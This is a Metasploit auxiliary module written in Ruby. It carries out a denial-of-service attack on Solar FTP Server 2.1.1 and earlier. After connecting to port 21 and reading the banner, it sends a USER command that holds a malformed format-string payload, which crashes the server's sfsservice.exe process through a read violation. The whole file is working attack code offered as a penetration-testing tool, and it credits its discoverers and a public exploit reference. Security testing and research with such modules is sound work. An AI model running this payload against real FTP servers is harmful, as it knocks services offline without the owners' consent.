##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Dos

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Solar FTP Server Malformed USER Denial of Service',
      'Description'    => %q{
        This module will send a format string as USER to Solar FTP, causing a
        READ violation in function "__output_1()" found in "sfsservice.exe"
        while trying to calculate the length of the string. This vulnerability
        affects versions 2.1.1 and earlier.
      },
      'Author'         =>
      [
        'x000 <3d3n[at]hotmail.com.br>',           #Initial disclosure/exploit
        'C4SS!0 G0M3S <Louredo_[at]hotmail.com>',  #Metasploit submission
        'sinn3r',                                  #Metasploit edit/commit
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
      [
        [ 'EDB', '16204' ],
      ],
      'DisclosureDate' => 'Feb 22 2011'))

      register_options(
      [
        Opt::RPORT(21)
      ],self.class)
  end

  def run
    connect

    banner = sock.get_once(-1, 10) || ''
    print_status("Banner: #{banner.strip}")

    buf  = Rex::Text.pattern_create(50)
    buf << "%s%lf%n%c%l%c%n%n%n%nC%lf%u%lf%d%s%v%n"
    print_status("Sending format string...")
    sock.put("USER #{buf}\r\n")

    disconnect
  end

end
